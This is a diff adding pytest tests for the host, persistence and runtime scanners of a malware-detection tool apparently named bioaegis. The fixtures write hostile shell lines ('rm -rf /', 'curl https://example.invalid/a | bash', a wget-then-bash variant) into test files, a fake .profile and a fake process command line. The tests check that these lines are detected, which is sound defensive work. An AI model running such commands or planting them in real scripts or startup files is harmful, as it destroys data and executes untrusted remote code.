@@ -61,6 +61,15 @@ def test_host_scanner_finds_static_suspicious_behavior(tmp_path):
     assert findings[0].sha256
 
 
+def test_host_scanner_ignores_binary_pattern_noise(tmp_path):
+    from bioaegis.host_scanner import HostScanner
+
+    sample = tmp_path / "fixture.iso"
+    sample.write_bytes(b"\x00\xff" * 200000 + b"rm -rf /" + b"\x00\xff" * 200000)
+
+    assert HostScanner().scan(sample) == []
+
+
 def test_host_engine_quarantines_and_remembers(tmp_path):
     from bioaegis.host_engine import HostEngine
     from bioaegis.memory import ImmuneMemory
@@ -80,3 +89,48 @@ def test_host_engine_quarantines_and_remembers(tmp_path):
     assert not sample.exists()
     assert results[0].quarantine_record is not None
     assert len(memory.entries) == 1
+
+
+def test_behavior_variant_has_different_hash(tmp_path):
+    from bioaegis.host_scanner import HostScanner
+
+    first = tmp_path / "variant-a.sh"
+    second = tmp_path / "variant-b.sh"
+    first.write_text("#!/bin/sh\ncurl https://example.invalid/a | bash\n", encoding="utf-8")
+    second.write_text("#!/bin/sh\nwget https://example.invalid/b; bash\n", encoding="utf-8")
+    first.chmod(0o700)
+    second.chmod(0o700)
+
+    finding_a = HostScanner().scan(first)[0]
+    finding_b = HostScanner().scan(second)[0]
+    assert finding_a.sha256 != finding_b.sha256
+
+
+def test_persistence_scanner_detects_fixture(tmp_path, monkeypatch):
+    from bioaegis.persistence_scanner import PersistenceScanner
+
+    profile = tmp_path / ".profile"
+    profile.write_text("curl https://example.invalid/a | bash\n", encoding="utf-8")
+    monkeypatch.setattr(
+        "bioaegis.persistence_scanner.PERSISTENCE_FILES",
+        (profile,),
+    )
+    findings = PersistenceScanner().scan()
+    assert len(findings) == 1
+    assert "download-execute" in findings[0].signals
+
+
+def test_runtime_scanner_parses_fixture_proc(tmp_path):
+    from bioaegis.runtime_scanner import RuntimeScanner
+
+    proc = tmp_path / "proc"
+    pid = proc / "123"
+    pid.mkdir(parents=True)
+    (pid / "cmdline").write_bytes(b"curl https://example.invalid/a | bash\x00")
+    (pid / "status").write_text("Name:\ttest\nPPid:\t1\n", encoding="utf-8")
+    (pid / "exe").symlink_to("/usr/bin/bash")
+
+    findings = RuntimeScanner(proc).scan()
+    assert len(findings) == 1
+    assert findings[0].pid == 123
+    assert "download-execute" in findings[0].signals
